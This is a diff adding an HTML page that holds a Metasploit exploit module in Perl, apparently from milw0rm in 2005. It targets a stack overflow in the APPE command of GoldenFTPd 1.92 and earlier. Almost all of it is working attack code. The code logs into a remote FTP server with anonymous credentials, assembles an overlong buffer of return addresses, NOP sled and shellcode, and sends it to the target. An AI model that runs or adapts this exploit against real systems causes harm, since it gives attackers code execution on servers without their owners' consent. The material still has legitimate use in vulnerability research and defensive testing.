@@ -1,0 +1,132 @@
+<html><head><title>Golden FTP Server <= 1.92 (APPE) Remote Overflow Exploit (meta)</title></head><pre>##
+# Written by Tim Shelton [redsand@redsand.net]
+# GoldenFTPd 
+##
+
+package Msf::Exploit::goldenftpd_appe;
+use base &quot;Msf::Exploit&quot;;
+use strict;
+use Pex::Text;
+
+my $advanced = { };
+
+my $info =
+  {
+	'Name'     =&gt; 'GoldenFTPd APPE &lt;= 1.92 Stack Overflow',
+	'Version'  =&gt; '$Revision: 1.0 $',
+	'Authors'  =&gt; [ 'Tim Shelton &lt;redsand [at] redsand.net&gt;', ],
+
+	'Arch'  =&gt; [ 'x86' ],
+	'OS'    =&gt; [ 'win32', 'win2000', 'winxp', 'win2003' ],
+	'Priv'  =&gt; 0,
+
+	'AutoOpts'  =&gt; { 'EXITFUNC' =&gt; 'thread' },
+	'UserOpts'  =&gt;
+	  {
+		'RHOST' =&gt; [1, 'ADDR', 'The target address'],
+		'RPORT' =&gt; [1, 'PORT', 'The target port', 21],
+		'USER'  =&gt; [1, 'DATA', 'Username', 'anonymous'],
+		'PASS'  =&gt; [1, 'DATA', 'Password', 'metasploit@'],
+	  },
+
+	'Payload'  =&gt;
+	  {
+		'Space' =&gt; 400,
+		'BadChars'  =&gt; &quot;\x00\x0a\x0d\x20&quot;,
+		'Keys' =&gt; ['+ws2ord'],
+	  },
+
+	'Description'  =&gt;  Pex::Text::Freeform(qq{
+		This module exploits a stack overflow in the GoldenFTPd
+	server. The flaw is triggered when a APPE command is received
+	with a specially crafted overly-long argument. This vulnerability 
+	affects all versions of GoldenFTPd prior to 1.92 and was discovered by
+	Tim Shelton.
+}),
+
+	'Refs'  =&gt;
+	  [
+		['RED-NET',   '2005-11-14-01'],
+	  ],
+
+	'DefaultTarget' =&gt; 0,
+	'Targets' =&gt;
+	  [
+		['GoldenFTPd Server &lt;= 1.92 Universal', 0x99998888, 0x11111111, 0x98d855eb, 0x0044395F], 
+	  ],
+
+	'Keys'  =&gt; ['goldenftp'],
+
+	'DisclosureDate' =&gt; 'NONE',
+  };
+
+sub new {
+	my $class = shift;
+	my $self = $class-&gt;SUPER::new({'Info' =&gt; $info, 'Advanced' =&gt; $advanced}, @_);
+	return($self);
+}
+
+sub Exploit {
+	my $self = shift;
+	my $target_host = $self-&gt;GetVar('RHOST');
+	my $target_port = $self-&gt;GetVar('RPORT');
+	my $target_idx  = $self-&gt;GetVar('TARGET');
+	my $shellcode   = $self-&gt;GetVar('EncodedPayload')-&gt;Payload;
+	my $target      = $self-&gt;Targets-&gt;[$target_idx];
+
+	if (! $self-&gt;InitNops(30)) {
+		$self-&gt;PrintLine(&quot;[*] Failed to initialize the NOP module.&quot;);
+		return;
+	}
+
+#	my $shellcode = &quot;\xeb\xfe\xeb\xfe\xeb\xfe\xeb\xfe\xeb\xfe\xeb\xfe&quot;;
+
+
+	my $evil = (&quot;APPE /&quot;);
+	$evil .= (&quot;A/&quot;)x120;
+
+	$evil .= (pack(&quot;V&quot;,$target-&gt;[3])) x 4;
+	$evil .= (pack(&quot;V&quot;,$target-&gt;[1]) . pack(&quot;V&quot;,$target-&gt;[2]) . pack(&quot;V&quot;,$target-&gt;[4]) . pack(&quot;V&quot;, $target-&gt;[1]) ) x 4;
+	$evil .= $self-&gt;MakeNops(30);
+	$evil .= $shellcode;
+	$evil .= &quot;\x0a\x0d&quot;;
+
+	my $s = Msf::Socket::Tcp-&gt;new
+	  (
+		'PeerAddr'  =&gt; $target_host,
+		'PeerPort'  =&gt; $target_port,
+		'LocalPort' =&gt; $self-&gt;GetVar('CPORT'),
+	  );
+
+	$self-&gt;PrintLine(sprintf (&quot;[*] Universal GoldenFTPd 1.93 Exploit by redsand\n&quot;));
+
+	if ($s-&gt;IsError) {
+		$self-&gt;PrintLine('[*] Error creating socket: ' . $s-&gt;GetError);
+		return;
+	}
+
+	$self-&gt;PrintLine(sprintf (&quot;[*] Trying &quot;.$target-&gt;[0].&quot; using return address 0x%.8x....&quot;, $target-&gt;[4]));
+
+	my $r = $s-&gt;Recv(-1, 30);
+	if (! $r) { $self-&gt;PrintLine(&quot;[*] No response from FTP server&quot;); return; }
+	($r) = $r =~ m/^([^\n\r]+)(\r|\n)/;
+	$self-&gt;PrintLine(&quot;[*] $r&quot;);
+
+	$self-&gt;PrintLine(&quot;[*] Login as &quot; .$self-&gt;GetVar('USER'). &quot;/&quot; .$self-&gt;GetVar('PASS'));
+	$s-&gt;Send(&quot;USER &quot;.$self-&gt;GetVar('USER').&quot;\r\n&quot;);
+	$r = $s-&gt;Recv(-1, 10);
+	if (! $r) { $self-&gt;PrintLine(&quot;[*] No response from FTP server&quot;); return; }
+
+	$s-&gt;Send(&quot;PASS &quot;.$self-&gt;GetVar('PASS').&quot;\r\n&quot;);
+	$r = $s-&gt;Recv(-1, 10);
+	if (! $r) { $self-&gt;PrintLine(&quot;[*] No response from FTP server&quot;); return; }
+
+	$self-&gt;PrintLine(&quot;[*] Sending evil buffer....&quot;);
+	$s-&gt;Send($evil);
+	$r = $s-&gt;Recv(-1, 10);
+	if (! $r) { $self-&gt;PrintLine(&quot;[*] No response from FTP server&quot;); return; }
+	$self-&gt;Print(&quot;[*] $r&quot;);
+	return;
+}
+
+# milw0rm.com [2005-12-20]</pre></html>
